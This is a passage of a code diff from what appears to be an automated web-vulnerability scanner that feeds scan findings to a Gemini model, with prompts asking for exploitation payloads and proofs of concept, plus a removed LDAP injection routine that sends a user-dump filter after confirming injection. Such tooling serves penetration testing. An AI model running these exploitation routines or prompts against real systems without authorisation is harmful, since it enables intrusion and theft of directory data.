-                        print(f"{Fore.CYAN}[*] AI Assistant analyzing Nuclei scan results for {target}...{Style.RESET_ALL}")
-
-                        try:
-
-                            with open(nuclei_output_file, 'r') as f:
-
-                                nuclei_content = f.read()
-
-                            
-
-                            prompt = f"Analyze the following Nuclei scan results for target {target}. List all identified vulnerabilities and their severity. For each vulnerability, provide a brief explanation and suggest immediate remediation steps or further exploitation paths.\n\nNuclei Scan Results:\n{nuclei_content}"
-
-                            
-
-                            response = await GEMINI_MODEL.generate_content_async(prompt)
-
-                            ai_response = response.text
-
-                            print(f"{Fore.GREEN}[+] AI Assistant Analysis for Nuclei Scan:\n{ai_response}{Style.RESET_ALL}")
-
-                            save_output(output_dir, "ai_nuclei_analysis.txt", ai_response)
-
-                            return ai_response
-
-                        except FileNotFoundError:
-
-                            print(f"{Fore.RED}[-] Nuclei output file not found for AI analysis: {nuclei_output_file}{Style.RESET_ALL}")
-
-                            return "Nuclei output file not found for AI analysis."
-
-                        except Exception as e:
-
-                            print(f"{Fore.RED}[-] AI Assistant Error for Nuclei Scan: {e}{Style.RESET_ALL}")
-
-                            return f"AI Assistant Error: {e}"
-
+                prompt = f"Analyze the following Nikto scan results for target {target}. Summarize identified vulnerabilities, misconfigurations, and informational findings. Prioritize the most critical issues and suggest specific exploitation techniques or remediation actions.\n\nNikto Scan Results:\n{nikto_content}"
                 
+                response = await GEMINI_MODEL.generate_content_async(prompt)
+                ai_response = response.text
+                print(f"{Fore.GREEN}[+] AI Assistant Analysis for Nikto Scan:\n{ai_response}{Style.RESET_ALL}")
+                save_output(output_dir, "ai_nikto_analysis.txt", ai_response)
+                return ai_response
+            except FileNotFoundError:
+                print(f"{Fore.RED}[-] Nikto output file not found for AI analysis: {nikto_output_file}{Style.RESET_ALL}")
+                return "Nikto output file not found for AI analysis."
+            except Exception as e:
+                print(f"{Fore.RED}[-] AI Assistant Error for Nikto Scan: {e}{Style.RESET_ALL}")
+                return f"AI Assistant Error: {e}"
 
-                    async def ai_assist_spider(target, output_dir, discovered_urls, discovered_forms):
-
-                        print(f"{Fore.CYAN}[*] AI Assistant analyzing spidering results for {target}...{Style.RESET_ALL}")
-
-                        prompt = f"Analyze the following discovered URLs and forms for target {target}. Identify any interesting endpoints, hidden parameters, or unusual form structures that might indicate potential vulnerabilities (e.g., IDOR, XSS, SQLi, LFI). Suggest specific URLs or forms to prioritize for further attack.\n\nDiscovered URLs ({len(discovered_urls)}):\n"
-
-                        for url in discovered_urls[:20]: # Limit for prompt size
-
-                            prompt += f"- {url}\n"
-
-                        if len(discovered_urls) > 20:
-
-                            prompt += f"- ...and {len(discovered_urls) - 20} more.\n"
-
-                        
-
-                        prompt += f"\nDiscovered Forms ({len(discovered_forms)}):\n"
-
-                        for form in discovered_forms[:10]: # Limit for prompt size
-
-                            prompt += f"- Action: {form.get('action', 'N/A')}, Method: {form.get('method', 'N/A')}, Inputs: {[i.get('name', 'N/A') for i in form.get('inputs', [])]}\n"
-
-                        if len(discovered_forms) > 10:
-
-                            prompt += f"- ...and {len(discovered_forms) - 10} more.\n"
-
+        async def ai_assist_nuclei(target, output_dir, nuclei_output_file):
+            print(f"{Fore.CYAN}[*] AI Assistant analyzing Nuclei scan results for {target}...{Style.RESET_ALL}")
+            try:
+                with open(nuclei_output_file, 'r') as f:
+                    nuclei_content = f.read()
                 
-
-                        try:
-
-                            response = await GEMINI_MODEL.generate_content_async(prompt)
-
-                            ai_response = response.text
-
-                            print(f"{Fore.GREEN}[+] AI Assistant Analysis for Spidering Results:\n{ai_response}{Style.RESET_ALL}")
-
-                            save_output(output_dir, "ai_spider_analysis.txt", ai_response)
-
-                            return ai_response
-
-                        except Exception as e:
-
-                            print(f"{Fore.RED}[-] AI Assistant Error for Spidering Results: {e}{Style.RESET_ALL}")
-
-                                        return f"AI Assistant Error: {e}"
-
-                            
-
-                                async def ai_assist_mongodb(target, output_dir, findings):
-
-                                    print(f"{Fore.CYAN}[*] AI Assistant analyzing MongoDB findings for {target}...{Style.RESET_ALL}")
-
-                                    prompt = f"Analyze the following MongoDB scan/exploit findings for target {target}. Summarize any vulnerabilities, misconfigurations, or sensitive data exposures. Suggest immediate next steps for exploitation or remediation.\n\nMongoDB Findings:\n"
-
-                                    for finding in findings:
-
-                                        prompt += f"- {finding}\n"
-
-                                    try:
-
-                                        response = await GEMINI_MODEL.generate_content_async(prompt)
-
-                                        ai_response = response.text
-
-                                        print(f"{Fore.GREEN}[+] AI Assistant Analysis for MongoDB:\n{ai_response}{Style.RESET_ALL}")
-
-                                        save_output(output_dir, "ai_mongodb_analysis.txt", ai_response)
-
-                                        return ai_response
-
-                                    except Exception as e:
-
-                                        print(f"{Fore.RED}[-] AI Assistant Error for MongoDB: {e}{Style.RESET_ALL}")
-
-                                        return f"AI Assistant Error: {e}"
-
-                            
-
-                                async def ai_assist_rtsp(target, output_dir, findings):
-
-                                    print(f"{Fore.CYAN}[*] AI Assistant analyzing RTSP findings for {target}...{Style.RESET_ALL}")
-
-                                    prompt = f"Analyze the following RTSP scan findings for target {target}. Identify any open streams, authentication issues, or potential vulnerabilities. Suggest next steps for exploitation or securing the RTSP service.\n\nRTSP Findings:\n"
-
-                                    for finding in findings:
-
-                                        prompt += f"- {finding}\n"
-
-                                    try:
-
-                                        response = await GEMINI_MODEL.generate_content_async(prompt)
-
-                                        ai_response = response.text
-
-                                        print(f"{Fore.GREEN}[+] AI Assistant Analysis for RTSP:\n{ai_response}{Style.RESET_ALL}")
-
-                                        save_output(output_dir, "ai_rtsp_analysis.txt", ai_response)
-
-                                        return ai_response
-
-                                    except Exception as e:
-
-                                        print(f"{Fore.RED}[-] AI Assistant Error for RTSP: {e}{Style.RESET_ALL}")
-
-                                        return f"AI Assistant Error: {e}"
-
-                            
-
-                                async def ai_assist_insecure_deserialization(target, output_dir, findings):
-
-                                    print(f"{Fore.CYAN}[*] AI Assistant analyzing Insecure Deserialization findings for {target}...{Style.RESET_ALL}")
-
-                                    prompt = f"Analyze the following Insecure Deserialization findings for target {target}. Summarize the type of deserialization vulnerability (Java, PHP, Python) and its potential for Remote Code Execution. Suggest specific payloads or techniques for further exploitation, and remediation advice.\n\nInsecure Deserialization Findings:\n"
-
-                                    for finding in findings:
-
-                                        prompt += f"- {finding}\n"
-
-                                    try:
-
-                                        response = await GEMINI_MODEL.generate_content_async(prompt)
-
-                                        ai_response = response.text
-
-                                        print(f"{Fore.GREEN}[+] AI Assistant Analysis for Insecure Deserialization:\n{ai_response}{Style.RESET_ALL}")
-
-                                        save_output(output_dir, "ai_insecure_deserialization_analysis.txt", ai_response)
-
-                                        return ai_response
-
-                                    except Exception as e:
-
-                                        print(f"{Fore.RED}[-] AI Assistant Error for Insecure Deserialization: {e}{Style.RESET_ALL}")
-
-                                        return f"AI Assistant Error: {e}"
-
-                            
-
-                                async def ai_assist_graphql_injection(target, output_dir, findings):
-
-                                    print(f"{Fore.CYAN}[*] AI Assistant analyzing GraphQL Injection findings for {target}...{Style.RESET_ALL}")
-
-                                    prompt = f"Analyze the following GraphQL Injection findings for target {target}. Summarize any schema disclosures, introspection vulnerabilities, or batching issues. Suggest specific GraphQL queries for further exploitation or remediation steps.\n\nGraphQL Injection Findings:\n"
-
-                                    for finding in findings:
-
-                                        prompt += f"- {finding}\n"
-
-                                    try:
-
-                                        response = await GEMINI_MODEL.generate_content_async(prompt)
-
-                                        ai_response = response.text
-
-                                        print(f"{Fore.GREEN}[+] AI Assistant Analysis for GraphQL Injection:\n{ai_response}{Style.RESET_ALL}")
-
-                                        save_output(output_dir, "ai_graphql_injection_analysis.txt", ai_response)
-
-                                        return ai_response
-
-                                    except Exception as e:
-
-                                        print(f"{Fore.RED}[-] AI Assistant Error for GraphQL Injection: {e}{Style.RESET_ALL}")
-
-                                        return f"AI Assistant Error: {e}"
-
-                            
-
-                                async def ai_assist_cors(target, output_dir, findings):
-
-                                    print(f"{Fore.CYAN}[*] AI Assistant analyzing CORS findings for {target}...{Style.RESET_ALL}")
-
-                                    prompt = f"Analyze the following CORS misconfiguration findings for target {target}. Explain the potential impact (e.g., data theft, credential exposure) and suggest remediation steps. If applicable, provide a proof-of-concept for exploitation.\n\nCORS Findings:\n"
-
-                                    for finding in findings:
-
-                                        prompt += f"- {finding}\n"
-
-                                    try:
-
-                                        response = await GEMINI_MODEL.generate_content_async(prompt)
-
-                                        ai_response = response.text
-
-                                        print(f"{Fore.GREEN}[+] AI Assistant Analysis for CORS:\n{ai_response}{Style.RESET_ALL}")
-
-                                        save_output(output_dir, "ai_cors_analysis.txt", ai_response)
-
-                                        return ai_response
-
-                                    except Exception as e:
-
-                                        print(f"{Fore.RED}[-] AI Assistant Error for CORS: {e}{Style.RESET_ALL}")
-
-                                        return f"AI Assistant Error: {e}"
-
-                            
-
-                                async def ai_assist_crlf(target, output_dir, findings):
-
-                                    print(f"{Fore.CYAN}[*] AI Assistant analyzing CRLF Injection findings for {target}...{Style.RESET_ALL}")
-
-                                    prompt = f"Analyze the following CRLF Injection findings for target {target}. Explain the potential impact (e.g., HTTP Response Splitting, XSS) and suggest remediation steps. If applicable, provide a proof-of-concept for exploitation.\n\nCRLF Findings:\n"
-
-                                    for finding in findings:
-
-                                        prompt += f"- {finding}\n"
-
-                                    try:
-
-                                        response = await GEMINI_MODEL.generate_content_async(prompt)
-
-                                        ai_response = response.text
-
-                                        print(f"{Fore.GREEN}[+] AI Assistant Analysis for CRLF Injection:\n{ai_response}{Style.RESET_ALL}")
-
-                                        save_output(output_dir, "ai_crlf_analysis.txt", ai_response)
-
-                                        return ai_response
-
-                                    except Exception as e:
-
-                                        print(f"{Fore.RED}[-] AI Assistant Error for CRLF Injection: {e}{Style.RESET_ALL}")
-
-                                        return f"AI Assistant Error: {e}"
-
-                            
-
-                                async def ai_assist_open_redirect(target, output_dir, findings):
-
-                                    print(f"{Fore.CYAN}[*] AI Assistant analyzing Open Redirect findings for {target}...{Style.RESET_ALL}")
-
-                                    prompt = f"Analyze the following Open Redirect findings for target {target}. Explain the potential impact (e.g., phishing, malware distribution) and suggest remediation steps. Provide a proof-of-concept for exploitation.\n\nOpen Redirect Findings:\n"
-
-                                    for finding in findings:
-
-                                        prompt += f"- {finding}\n"
-
-                                    try:
-
-                                        response = await GEMINI_MODEL.generate_content_async(prompt)
-
-                                        ai_response = response.text
-
-                                        print(f"{Fore.GREEN}[+] AI Assistant Analysis for Open Redirect:\n{ai_response}{Style.RESET_ALL}")
-
-                                        save_output(output_dir, "ai_open_redirect_analysis.txt", ai_response)
-
-                                        return ai_response
-
-                                    except Exception as e:
-
-                                        print(f"{Fore.RED}[-] AI Assistant Error for Open Redirect: {e}{Style.RESET_ALL}")
-
-                                        return f"AI Assistant Error: {e}"
-
-                            
-
-                                async def ai_assist_ssrf(target, output_dir, findings):
-
-                                    print(f"{Fore.CYAN}[*] AI Assistant analyzing SSRF findings for {target}...{Style.RESET_ALL}")
-
-                                    prompt = f"Analyze the following SSRF findings for target {target}. Explain the potential impact (e.g., internal network access, cloud metadata exposure) and suggest remediation steps. Provide specific internal URLs or payloads for further exploitation.\n\nSSRF Findings:\n"
-
-                                    for finding in findings:
-
-                                        prompt += f"- {finding}\n"
-
-                                    try:
-
-                                        response = await GEMINI_MODEL.generate_content_async(prompt)
-
-                                        ai_response = response.text
-
-                                        print(f"{Fore.GREEN}[+] AI Assistant Analysis for SSRF:\n{ai_response}{Style.RESET_ALL}")
-
-                                        save_output(output_dir, "ai_ssrf_analysis.txt", ai_response)
-
-                                        return ai_response
-
-                                    except Exception as e:
-
-                                        print(f"{Fore.RED}[-] AI Assistant Error for SSRF: {e}{Style.RESET_ALL}")
-
-                                        return f"AI Assistant Error: {e}"
-
-                            
-
-                                async def ai_assist_react2shell(target, output_dir, findings):
-
-                                    print(f"{Fore.CYAN}[*] AI Assistant analyzing React2Shell findings for {target}...{Style.RESET_ALL}")
-
-                                    prompt = f"Analyze the following React2Shell findings for target {target}. Explain the potential for Remote Code Execution (RCE) and suggest remediation steps. Provide specific payloads or techniques for further exploitation.\n\nReact2Shell Findings:\n"
-
-                                    for finding in findings:
-
-                                        prompt += f"- {finding}\n"
-
-                                    try:
-
-                                        response = await GEMINI_MODEL.generate_content_async(prompt)
-
-                                        ai_response = response.text
-
-                                        print(f"{Fore.GREEN}[+] AI Assistant Analysis for React2Shell:\n{ai_response}{Style.RESET_ALL}")
-
-                                        save_output(output_dir, "ai_react2shell_analysis.txt", ai_response)
-
-                                        return ai_response
-
-                                    except Exception as e:
-
-                                        print(f"{Fore.RED}[-] AI Assistant Error for React2Shell: {e}{Style.RESET_ALL}")
-
-                                        return f"AI Assistant Error: {e}"
-
-                            
-
-                                async def ai_assist_xxe(target, output_dir, findings):
-
-                                    print(f"{Fore.CYAN}[*] AI Assistant analyzing XXE findings for {target}...{Style.RESET_ALL}")
-
-                                    prompt = f"Analyze the following XXE (XML External Entity) findings for target {target}. Explain the potential impact (e.g., local file disclosure, SSRF, RCE) and suggest remediation steps. Provide specific XXE payloads for further exploitation.\n\nXXE Findings:\n"
-
-                                    for finding in findings:
-
-                                        prompt += f"- {finding}\n"
-
-                                    try:
-
-                                        response = await GEMINI_MODEL.generate_content_async(prompt)
-
-                                        ai_response = response.text
-
-                                        print(f"{Fore.GREEN}[+] AI Assistant Analysis for XXE:\n{ai_response}{Style.RESET_ALL}")
-
-                                        save_output(output_dir, "ai_xxe_analysis.txt", ai_response)
-
-                                        return ai_response
-
-                                    except Exception as e:
-
-                                        print(f"{Fore.RED}[-] AI Assistant Error for XXE: {e}{Style.RESET_ALL}")
-
-                                        return f"AI Assistant Error: {e}"
-
-                            
-
-                                async def ai_assist_csrf(target, output_dir, findings):
-
-                                    print(f"{Fore.CYAN}[*] AI Assistant analyzing CSRF findings for {target}...{Style.RESET_ALL}")
-
-                                    prompt = f"Analyze the following CSRF (Cross-Site Request Forgery) findings for target {target}. Explain the potential impact (e.g., unauthorized actions, account takeover) and suggest remediation steps. Provide a proof-of-concept for exploitation.\n\nCSRF Findings:\n"
-
-                                    for finding in findings:
-
-                                        prompt += f"- {finding}\n"
-
-                                    try:
-
-                                        response = await GEMINI_MODEL.generate_content_async(prompt)
-
-                                        ai_response = response.text
-
-                                        print(f"{Fore.GREEN}[+] AI Assistant Analysis for CSRF:\n{ai_response}{Style.RESET_ALL}")
-
-                                        save_output(output_dir, "ai_csrf_analysis.txt", ai_response)
-
-                                        return ai_response
-
-                                    except Exception as e:
-
-                                        print(f"{Fore.RED}[-] AI Assistant Error for CSRF: {e}{Style.RESET_ALL}")
-
-                                        return f"AI Assistant Error: {e}"
-
-                            
-
-                                async def ai_assist_file_inclusion(target, output_dir, findings):
-
-                                    print(f"{Fore.CYAN}[*] AI Assistant analyzing File Inclusion findings for {target}...{Style.RESET_ALL}")
-
-                                    prompt = f"Analyze the following File Inclusion (LFI/RFI) findings for target {target}. Explain the potential impact (e.g., sensitive file disclosure, RCE) and suggest remediation steps. Provide specific payloads or techniques for further exploitation.\n\nFile Inclusion Findings:\n"
-
-                                    for finding in findings:
-
-                                        prompt += f"- {finding}\n"
-
-                                    try:
-
-                                        response = await GEMINI_MODEL.generate_content_async(prompt)
-
-                                        ai_response = response.text
-
-                                        print(f"{Fore.GREEN}[+] AI Assistant Analysis for File Inclusion:\n{ai_response}{Style.RESET_ALL}")
-
-                                        save_output(output_dir, "ai_file_inclusion_analysis.txt", ai_response)
-
-                                        return ai_response
-
-                                    except Exception as e:
-
-                                        print(f"{Fore.RED}[-] AI Assistant Error for File Inclusion: {e}{Style.RESET_ALL}")
-
-                                        return f"AI Assistant Error: {e}"
-
-                            
-
-                                async def ai_assist_brute_force_login(target, output_dir, findings):
-
-                                    print(f"{Fore.CYAN}[*] AI Assistant analyzing Brute Force Login findings for {target}...{Style.RESET_ALL}")
-
-                                    prompt = f"Analyze the following Brute Force Login findings for target {target}. Summarize any successful credential compromises or weak login mechanisms. Suggest remediation steps (e.g., rate limiting, CAPTCHA, MFA) and further exploitation paths.\n\nBrute Force Login Findings:\n"
-
-                                    for finding in findings:
-
-                                        prompt += f"- {finding}\n"
-
-                                    try:
-
-                                        response = await GEMINI_MODEL.generate_content_async(prompt)
-
-                                        ai_response = response.text
-
-                                        print(f"{Fore.GREEN}[+] AI Assistant Analysis for Brute Force Login:\n{ai_response}{Style.RESET_ALL}")
-
-                                        save_output(output_dir, "ai_brute_force_login_analysis.txt", ai_response)
-
-                                        return ai_response
-
-                                    except Exception as e:
-
-                                        print(f"{Fore.RED}[-] AI Assistant Error for Brute Force Login: {e}{Style.RESET_ALL}")
-
-                                        return f"AI Assistant Error: {e}"
-
-                            
-
-                                async def test_single_ldap_payload(point, payload):
-
-                            
-
+                prompt = f"Analyze the following Nuclei scan results for target {target}. List all identified vulnerabilities and their severity. For each vulnerability, provide a brief explanation and suggest immediate remediation steps or further exploitation paths.\n\nNuclei Scan Results:\n{nuclei_content}"
                 
-        for encoded_p in get_encoded_payloads(payload):
-            test_url, test_data = build_request(point['url'], point['method'], point['param'], point['value'] + encoded_p, point['form_data'], point['original_query'])
-            res, request_details, response_details = await _send_async_http_request(test_url, method=point['method'], data=test_data, output=output, session_cookies=session_cookies)
+                response = await GEMINI_MODEL.generate_content_async(prompt)
+                ai_response = response.text
+                print(f"{Fore.GREEN}[+] AI Assistant Analysis for Nuclei Scan:\n{ai_response}{Style.RESET_ALL}")
+                save_output(output_dir, "ai_nuclei_analysis.txt", ai_response)
+                return ai_response
+            except FileNotFoundError:
+                print(f"{Fore.RED}[-] Nuclei output file not found for AI analysis: {nuclei_output_file}{Style.RESET_ALL}")
+                return "Nuclei output file not found for AI analysis."
+            except Exception as e:
+                print(f"{Fore.RED}[-] AI Assistant Error for Nuclei Scan: {e}{Style.RESET_ALL}")
+                return f"AI Assistant Error: {e}"
 
-            if res and await res.text() and any(e in (await res.text()).lower() for e in ldap_errors):
-                output.print(f"  [CRITICAL] Error-Based LDAP Injection confirmed in {point['method'].upper()} param '{point['param']}' with payload: {encoded_p}")
-                evidence = f"Vulnerable URL: {test_url}\nPayload: {encoded_p}\n\n--- Response Snippet (Error Message) ---\n{(await res.text())[:400]}\n---"
-                
-                dump_payload = "(&(objectClass=*)(uid=*))"
-                dump_url, dump_data = build_request(point['url'], point['method'], point['param'], point['value'] + dump_payload, point['form_data'], point['original_query'])
-                res_dump, _, _ = await _send_async_http_request(dump_url, method=point['method'], data=dump_data, output=output, session_cookies=session_cookies)
-                if res_dump and await res_dump.text() and not any(e in (await res_dump.text()).lower() for e in ldap_errors):
-                    evidence += f"\n\n--- Post-Exploitation (User Dump Attempt) ---\nPayload: {dump_payload}\nResponse Snippet:\n{(await res_dump.text())[:500]}\n---"
-                    output.print(f"    [SUCCESS] Post-exploitation payload sent. Response may contain user data.")
+        async def ai_assist_spider(target, output_dir, discovered_urls, discovered_forms):
+            print(f"{Fore.CYAN}[*] AI Assistant analyzing spidering results for {target}...{Style.RESET_ALL}")
+            prompt = f"Analyze the following discovered URLs and forms for target {target}. Identify any interesting endpoints, hidden parameters, or unusual form structures that might indicate potential vulnerabilities (e.g., IDOR, XSS, SQLi, LFI). Suggest specific URLs or forms to prioritize for further attack.\n\nDiscovered URLs ({len(discovered_urls)}):\n"
+            for url in discovered_urls[:20]: # Limit for prompt size
+                prompt += f"- {url}\n"
+            if len(discovered_urls) > 20:
+                prompt += f"- ...and {len(discovered_urls) - 20} more.\n"
+            
+            prompt += f"\nDiscovered Forms ({len(discovered_forms)}):\n"
+            for form in discovered_forms[:10]: # Limit for prompt size
+                prompt += f"- Action: {form.get('action', 'N/A')}, Method: {form.get('method', 'N/A')}, Inputs: {[i.get('name', 'N/A') for i in form.get('inputs', [])]}\n"
+            if len(discovered_forms) > 10:
+                prompt += f"- ...and {len(discovered_forms) - 10} more.\n"
+    
+            try:
+                response = await GEMINI_MODEL.generate_content_async(prompt)
+                ai_response = response.text
+                print(f"{Fore.GREEN}[+] AI Assistant Analysis for Spidering Results:\n{ai_response}{Style.RESET_ALL}")
+                save_output(output_dir, "ai_spider_analysis.txt", ai_response)
+                return ai_response
+            except Exception as e:
+                print(f"{Fore.RED}[-] AI Assistant Error for Spidering Results: {e}{Style.RESET_ALL}")
+                return f"AI Assistant Error: {e}"
 
-                report.add_finding("LDAP Injection", "Critical", point['url'], point['param'], encoded_p,
-                                   "The application is vulnerable to LDAP Injection, allowing query manipulation.",
-                                   "Use parameterized LDAP queries or a safe query construction library. Sanitize all user input used in LDAP filters.",
-                                   evidence, method=point['method'], request_details=request_details, response_details=response_details)
-                return True
-        return False
+        async def ai_assist_mongodb(target, output_dir, findings):
+            print(f"{Fore.CYAN}[*] AI Assistant analyzing MongoDB findings for {target}...{Style.RESET_ALL}")
+            prompt = f"Analyze the following MongoDB scan/exploit findings for target {target}. Summarize any vulnerabilities, misconfigurations, or sensitive data exposures. Suggest immediate next steps for exploitation or remediation.\n\nMongoDB Findings:\n"
+            for finding in findings:
+                prompt += f"- {finding}\n"
+            try:
+                response = await GEMINI_MODEL.generate_content_async(prompt)
+                ai_response = response.text
+                print(f"{Fore.GREEN}[+] AI Assistant Analysis for MongoDB:\n{ai_response}{Style.RESET_ALL}")
+                save_output(output_dir, "ai_mongodb_analysis.txt", ai_response)
+                return ai_response
+            except Exception as e:
+                print(f"{Fore.RED}[-] AI Assistant Error for MongoDB: {e}{Style.RESET_ALL}")
+                return f"AI Assistant Error: {e}"
+
+        async def ai_assist_rtsp(target, output_dir, findings):
+            print(f"{Fore.CYAN}[*] AI Assistant analyzing RTSP findings for {target}...{Style.RESET_ALL}")
+            prompt = f"Analyze the following RTSP scan findings for target {target}. Identify any open streams, authentication issues, or potential vulnerabilities. Suggest next steps for exploitation or securing the RTSP service.\n\nRTSP Findings:\n"
+            for finding in findings:
+                prompt += f"- {finding}\n"
+            try:
+                response = await GEMINI_MODEL.generate_content_async(prompt)
+                ai_response = response.text
+                print(f"{Fore.GREEN}[+] AI Assistant Analysis for RTSP:\n{ai_response}{Style.RESET_ALL}")
+                save_output(output_dir, "ai_rtsp_analysis.txt", ai_response)
+                return ai_response
+            except Exception as e:
+                print(f"{Fore.RED}[-] AI Assistant Error for RTSP: {e}{Style.RESET_ALL}")
+                return f"AI Assistant Error: {e}"
+
+        async def ai_assist_insecure_deserialization(target, output_dir, findings):
+            print(f"{Fore.CYAN}[*] AI Assistant analyzing Insecure Deserialization findings for {target}...{Style.RESET_ALL}")
+            prompt = f"Analyze the following Insecure Deserialization findings for target {target}. Summarize the type of deserialization vulnerability (Java, PHP, Python) and its potential for Remote Code Execution. Suggest specific payloads or techniques for further exploitation, and remediation advice.\n\nInsecure Deserialization Findings:\n"
+            for finding in findings:
+                prompt += f"- {finding}\n"
+            try:
+                response = await GEMINI_MODEL.generate_content_async(prompt)
+                ai_response = response.text
+                print(f"{Fore.GREEN}[+] AI Assistant Analysis for Insecure Deserialization:\n{ai_response}{Style.RESET_ALL}")
+                save_output(output_dir, "ai_insecure_deserialization_analysis.txt", ai_response)
+                return ai_response
+            except Exception as e:
+                print(f"{Fore.RED}[-] AI Assistant Error for Insecure Deserialization: {e}{Style.RESET_ALL}")
+                return f"AI Assistant Error: {e}"
+
+        async def ai_assist_graphql_injection(target, output_dir, findings):
+            print(f"{Fore.CYAN}[*] AI Assistant analyzing GraphQL Injection findings for {target}...{Style.RESET_ALL}")
+            prompt = f"Analyze the following GraphQL Injection findings for target {target}. Summarize any schema disclosures, introspection vulnerabilities, or batching issues. Suggest specific GraphQL queries for further exploitation or remediation steps.\n\nGraphQL Injection Findings:\n"
+            for finding in findings:
+                prompt += f"- {finding}\n"
+            try:
+                response = await GEMINI_MODEL.generate_content_async(prompt)
+                ai_response = response.text
+                print(f"{Fore.GREEN}[+] AI Assistant Analysis for GraphQL Injection:\n{ai_response}{Style.RESET_ALL}")
+                save_output(output_dir, "ai_graphql_injection_analysis.txt", ai_response)
+                return ai_response
+            except Exception as e:
+                print(f"{Fore.RED}[-] AI Assistant Error for GraphQL Injection: {e}{Style.RESET_ALL}")
+                return f"AI Assistant Error: {e}"
+
+        async def ai_assist_cors(target, output_dir, findings):
+            print(f"{Fore.CYAN}[*] AI Assistant analyzing CORS findings for {target}...{Style.RESET_ALL}")
+            prompt = f"Analyze the following CORS misconfiguration findings for target {target}. Explain the potential impact (e.g., data theft, credential exposure) and suggest remediation steps. If applicable, provide a proof-of-concept for exploitation.\n\nCORS Findings:\n"
+            for finding in findings:
+                prompt += f"- {finding}\n"
+            try:
+                response = await GEMINI_MODEL.generate_content_async(prompt)
+                ai_response = response.text
+                print(f"{Fore.GREEN}[+] AI Assistant Analysis for CORS:\n{ai_response}{Style.RESET_ALL}")
+                save_output(output_dir, "ai_cors_analysis.txt", ai_response)
+                return ai_response
+            except Exception as e:
+                print(f"{Fore.RED}[-] AI Assistant Error for CORS: {e}{Style.RESET_ALL}")
+                return f"AI Assistant Error: {e}"
+
+        async def ai_assist_crlf(target, output_dir, findings):
+            print(f"{Fore.CYAN}[*] AI Assistant analyzing CRLF Injection findings for {target}...{Style.RESET_ALL}")
+            prompt = f"Analyze the following CRLF Injection findings for target {target}. Explain the potential impact (e.g., HTTP Response Splitting, XSS) and suggest remediation steps. If applicable, provide a proof-of-concept for exploitation.\n\nCRLF Findings:\n"
+            for finding in findings:
+                prompt += f"- {finding}\n"
+            try:
+                response = await GEMINI_MODEL.generate_content_async(prompt)
+                ai_response = response.text
+                print(f"{Fore.GREEN}[+] AI Assistant Analysis for CRLF Injection:\n{ai_response}{Style.RESET_ALL}")
+                save_output(output_dir, "ai_crlf_analysis.txt", ai_response)
+                return ai_response
+            except Exception as e:
+                print(f"{Fore.RED}[-] AI Assistant Error for CRLF Injection: {e}{Style.RESET_ALL}")
+                return f"AI Assistant Error: {e}"
+
+        async def ai_assist_open_redirect(target, output_dir, findings):
+            print(f"{Fore.CYAN}[*] AI Assistant analyzing Open Redirect findings for {target}...{Style.RESET_ALL}")
+            prompt = f"Analyze the following Open Redirect findings for target {target}. Explain the potential impact (e.g., phishing, malware distribution) and suggest remediation steps. Provide a proof-of-concept for exploitation.\n\nOpen Redirect Findings:\n"
+            for finding in findings:
+                prompt += f"- {finding}\n"
+            try:
+                response = await GEMINI_MODEL.generate_content_async(prompt)
+                ai_response = response.text
+                print(f"{Fore.GREEN}[+] AI Assistant Analysis for Open Redirect:\n{ai_response}{Style.RESET_ALL}")
+                save_output(output_dir, "ai_open_redirect_analysis.txt", ai_response)
+                return ai_response
+            except Exception as e:
+                print(f"{Fore.RED}[-] AI Assistant Error for Open Redirect: {e}{Style.RESET_ALL}")
+                return f"AI Assistant Error: {e}"
+
+        async def ai_assist_ssrf(target, output_dir, findings):
+            print(f"{Fore.CYAN}[*] AI Assistant analyzing SSRF findings for {target}...{Style.RESET_ALL}")
+            prompt = f"Analyze the following SSRF findings for target {target}. Explain the potential impact (e.g., internal network access, cloud metadata exposure) and suggest remediation steps. Provide specific internal URLs or payloads for further exploitation.\n\nSSRF Findings:\n"
+            for finding in findings:
+                prompt += f"- {finding}\n"
+            try:
+                response = await GEMINI_MODEL.generate_content_async(prompt)
+                ai_response = response.text
+                print(f"{Fore.GREEN}[+] AI Assistant Analysis for SSRF:\n{ai_response}{Style.RESET_ALL}")
+                save_output(output_dir, "ai_ssrf_analysis.txt", ai_response)
+                return ai_response
+            except Exception as e:
+                print(f"{Fore.RED}[-] AI Assistant Error for SSRF: {e}{Style.RESET_ALL}")
+                return f"AI Assistant Error: {e}"
+
+        async def ai_assist_react2shell(target, output_dir, findings):
+            print(f"{Fore.CYAN}[*] AI Assistant analyzing React2Shell findings for {target}...{Style.RESET_ALL}")
+            prompt = f"Analyze the following React2Shell findings for target {target}. Explain the potential for Remote Code Execution (RCE) and suggest remediation steps. Provide specific payloads or techniques for further exploitation.\n\nReact2Shell Findings:\n"
+            for finding in findings:
+                prompt += f"- {finding}\n"
+            try:
+                response = await GEMINI_MODEL.generate_content_async(prompt)
+                ai_response = response.text
+                print(f"{Fore.GREEN}[+] AI Assistant Analysis for React2Shell:\n{ai_response}{Style.RESET_ALL}")
+                save_output(output_dir, "ai_react2shell_analysis.txt", ai_response)
+                return ai_response
+            except Exception as e:
+                print(f"{Fore.RED}[-] AI Assistant Error for React2Shell: {e}{Style.RESET_ALL}")
+                return f"AI Assistant Error: {e}"
+
+        async def ai_assist_xxe(target, output_dir, findings):
+            print(f"{Fore.CYAN}[*] AI Assistant analyzing XXE findings for {target}...{Style.RESET_ALL}")
+            prompt = f"Analyze the following XXE (XML External Entity) findings for target {target}. Explain the potential impact (e.g., local file disclosure, SSRF, RCE) and suggest remediation steps. Provide specific XXE payloads for further exploitation.\n\nXXE Findings:\n"
+            for finding in findings:
+                prompt += f"- {finding}\n"
+            try:
+                response = await GEMINI_MODEL.generate_content_async(prompt)
+                ai_response = response.text
+                print(f"{Fore.GREEN}[+] AI Assistant Analysis for XXE:\n{ai_response}{Style.RESET_ALL}")
+                save_output(output_dir, "ai_xxe_analysis.txt", ai_response)
+                return ai_response
+            except Exception as e:
+                print(f"{Fore.RED}[-] AI Assistant Error for XXE: {e}{Style.RESET_ALL}")
+                return f"AI Assistant Error: {e}"
+
+        async def ai_assist_csrf(target, output_dir, findings):
+            print(f"{Fore.CYAN}[*] AI Assistant analyzing CSRF findings for {target}...{Style.RESET_ALL}")
+            prompt = f"Analyze the following CSRF (Cross-Site Request Forgery) findings for target {target}. Explain the potential impact (e.g., unauthorized actions, account takeover) and suggest remediation steps. Provide a proof-of-concept for exploitation.\n\nCSRF Findings:\n"
+            for finding in findings:
+                prompt += f"- {finding}\n"
+            try:
+                response = await GEMINI_MODEL.generate_content_async(prompt)
+                ai_response = response.text
